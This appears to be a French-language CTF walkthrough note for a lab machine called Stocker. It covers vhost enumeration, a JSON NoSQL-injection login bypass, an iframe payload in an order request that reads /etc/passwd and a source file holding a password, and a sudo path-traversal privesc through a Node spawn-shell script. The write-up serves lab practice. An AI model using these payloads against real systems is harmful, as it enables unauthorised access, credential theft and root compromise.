---
Platform: linux
Category: ctf
Difficulty: easy
Tags:
Status: pending
public: true
IP: 10.10.11.196
---

![[Stocker-1.png]]

```
└─# gobuster vhost -u stocker.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --append-domain
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://stocker.htb
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] User Agent:      gobuster/3.4
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
2023/02/06 23:13:46 Starting gobuster in VHOST enumeration mode
===============================================================
Found: dev.stocker.htb Status: 302 [Size: 28] [--> /login]
Progress: 10409 / 220561 (4.72%)^C
[!] Keyboard interrupt detected, terminating.

===============================================================
2023/02/06 23:14:15 Finished

```

vhost trouvé via vhost enumeration : dev.stocker.htb

Bypass de l'authent avec au format JSON une NoSQL injection :

```
POST /login HTTP/1.1
Host: dev.stocker.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 54
Origin: http://dev.stocker.htb
Connection: close
Referer: http://dev.stocker.htb/login
Cookie: connect.sid=s%3AFhbvDc7SEo_kF1-Bq2JuLGxucLWMeG5V.8UeivYzWZ%2BTMk30M8JbOTskUP1MWxYSf6%2BW3My5HcCo
Upgrade-Insecure-Requests: 1

{"username": {"$ne": null}, "password": {"$ne": null}}
```

Tentative de SSTI avec ${7*7} et

Brute force du username : angoose

Brute force du password : b3e795719e2a644f69838a593dd159ac

"$;|^{{}}''"

{"_id":"638f116eeb060210cbd83a93","title":"Toilet Paper","description":"It's toilet paper.","image":"toilet-paper.jpg","price":0.69,"currentStock":4212,"__v":0}

user length : 7  angoose

password length : 32 chars

il y a un endpoint /api/products

							/api/po/

						
- il y a peut être d'autre endpoint en 2 chars ??
- revoir si on ne peut pas ajouter un product ou en modifier 1 ???
- pour peut être faire une SSTI ou LFI (via l'image) ?
- Voir à rebruteforcer et lister les bad chars (status  != 302)
	- voir ce qu'on pourraît faire avec ca ...?
					------------------
SSFI :

```
POST /api/order HTTP/1.1

Host: dev.stocker.htb

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0

Accept: */*

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Referer: http://dev.stocker.htb/stock

Content-Type: application/json

Origin: http://dev.stocker.htb

Content-Length: 214

Connection: close

Cookie: connect.sid=s%3Avl0rPp-i53IWRGNVdk7aCDRGnBn-yuyG.InPe1bsghz6TrAW2SEdKTwYuWY%2FTpy0bRLDr3Dh5jME



{"basket":[{"_id":"638f116eeb060210cbd83a8d","title":"<iframe src=/etc/passwd height=900 width=500></iframe>","description":"It's a red cup.","image":"red-cup.jpg","price":32,"currentStock":4,"__v":0,"amount":1}]}
```

password : IHeardPassphrasesArePrettySecure (from /var/www/dev/index.js)

privesc

```
Matching Defaults entries for angoose on stocker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User angoose may run the following commands on stocker:
    (ALL) /usr/bin/node /usr/local/scripts/*.js

```

using sudo path traversal

```bash
# cat /tmp/rebrec/shell.js
const { spawn } = require('child_process')
const shell = spawn('sh',[], { stdio: 'inherit' })
shell.on('close',(code)=>{console.log('[shell] terminated :',code)})
```

```bash

```sudo /usr/bin/node /usr/local/scripts/../../../../../tmp/rebrec/shell.js


```
